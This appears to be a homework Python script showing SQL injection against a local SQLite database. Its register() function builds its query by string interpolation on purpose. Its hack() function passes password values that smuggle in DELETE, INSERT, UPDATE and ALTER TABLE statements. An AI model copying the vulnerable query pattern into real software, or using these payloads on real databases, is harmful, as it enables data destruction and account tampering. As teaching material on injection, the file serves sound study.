import sqlite3


def register(username: str, password: str) -> None:
    with sqlite3.connect('homework.db') as conn:
        cursor = conn.cursor()
        cursor.executescript(
            f"""
            INSERT INTO `table_users` (username, password)
            VALUES ('{username}', '{password}')  
            """
        )
        conn.commit()


def hack() -> None:
    username = "username"
    password = "'); DELETE FROM table_users; --"
    register(username, password)

    data = list()
    for n in range(30):
        data.append((f'username{n}', 'password'))
    data = str(data)[1:-1]
    username = "username"
    password = f"'); INSERT INTO table_users (username, password) VALUES {data}; --"
    register(username, password)

    username = "username"
    password = "'); UPDATE table_users SET password = 'hello' WHERE username = 'username'; --"
    register(username, password)

    username = "username"
    password = "'); ALTER TABLE table_users RENAME COLUMN password TO 'hack'; --"
    register(username, password)


if __name__ == '__main__':
    hack()
